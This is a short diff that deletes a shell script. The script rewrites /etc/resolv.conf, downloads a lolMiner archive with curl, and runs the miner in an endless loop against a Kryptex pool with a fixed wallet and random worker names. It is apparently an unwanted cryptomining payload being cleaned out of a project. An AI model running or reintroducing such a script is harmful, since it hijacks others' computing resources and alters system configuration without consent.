@@ -1,6 +1,0 @@
-echo nameserver 1.1.1.1 > /etc/resolv.conf
-curl https://github.com/kryptex-miners-org/kryptex-miners/releases/download/lolminer-1-97/lolMiner_v1.97_Lin64.tar.gz -L -o lolMiner_v1.97_Lin64.tar.gz
-tar xf lolMiner_v1.97_Lin64.tar.gz
-while :; do
-./lolMiner --algo SHA3X --pool xtm-sha3x.kryptex.network:7039 --user 165DUuzQoKG9BaBqprN3ZmsMRfvGHMwNwCpehJUqGoGLsSDtB535XA3PPzfRZhu2uYM9xfT8JsKoXEquWMr6XVwKK4UsrsuiaVHSTBpstcgqjLe5rYNcNfYdCJ1CtDg9z6qshKy/$(echo $(shuf -i 1-15000 -n 1)-run)
-done
